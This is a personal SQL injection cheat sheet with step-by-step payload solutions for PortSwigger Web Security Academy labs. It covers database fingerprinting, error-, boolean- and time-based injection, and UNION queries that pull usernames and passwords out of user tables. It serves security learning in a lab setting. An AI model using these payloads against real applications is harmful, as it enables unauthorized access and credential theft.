## Finding the Database Version
**MySQL and MSSQL**
`',nickName=@@version,email='`
** For Oracle **
`',nickName=(SELECT banner FROM v$version),email='`
** For SQLite **
`',nickName=sqlite_version(),email='`

## Error-Based
* `CASE
    WHEN condition1 THEN result1
    WHEN condition2 THEN result2
    WHEN conditionN THEN resultN
    ELSE result
END;`
* `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
   xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`
* `CAST((SELECT example_column FROM example_table) AS int)`
* * Oracle 	`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`
  * Microsoft 	`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`
  * PostgreSQL 	`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`
  * MySQL 	`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') `


### Extra
* `',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='` 

* `',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='`

* `',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='`

### Portswigger Lab Solution

************Lab 1:************

[`https://0ae400e603589e9682b8f6d70007000d.web-security-academy.net/filter?category=Accessories%27%20or%201=1--`](https://0ae400e603589e9682b8f6d70007000d.web-security-academy.net/filter?category=Accessories%27%20or%201=1--)

In short: `‘ or 1=1—`

************Lab 2:************

Username: administrator’—

password: anything

************Lab 3:************

[`https://0ab7007f04c9464f81aad5ee002600c7.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20union%20select%20null,null,null--`](https://0ab7007f04c9464f81aad5ee002600c7.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20union%20select%20null,null,null--)

In short: `‘union select null,null,null—`

************Lab 4:************

`' union select null,'snEL3e',null—`

************Lab 5:************

`' union select username, password from users—`

************Lab 6:************

`' union select null,username || '~' || password from users—`

************Lab 7:************

`' union select banner,null from v$version—`

************Lab 8:************

`' union select null,@@version#`

************Lab 9:************

`' union select table_name,null from information_schema.tables—`

`' union select column_name,null from information_schema.columns where table_name = 'users_nrdogg'—`

`' union select username_rkwgpt,password_vkiejw from users_nrdogg—`

**************Lab 10:**************

`' union select table_name,'null' from all_tables—`

`‘ union select column_name,null from all_tab_columns where table_name=’USERS_AFMITF’—`

`' union select USERNAME_PZTRWZ,PASSWORD_GTYDKD from USERS_AFMITF—`

**************Lab 11:**************

Test by injecting the following code to the cookie value:

`…xyz and 1=1` It should take you to the welcome page

`…xyz and 1=0` It won’t take you to the welcome page

If those codes show desired outputs, the website is vulnerable to SQL Injection

`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a’`--

If it shows a welcome page, there is a table called users

`' and substring((select 'a' from users where username='administrator'),1,1)='a'—`

If it shows a welcome page, there is an user named administrator

https://www.youtube.com/watch?v=LBG_n9fr8sM

**************Lab 14:**************
<br>  <br>
`TrackingId=' || pg_sleep(10)-- -`

**Lab 15:**

Use “Response Received” column from intruder and use it to sort the characters that took the most time


## CheatSheets
* [Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [Advanced SQL Injection](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)
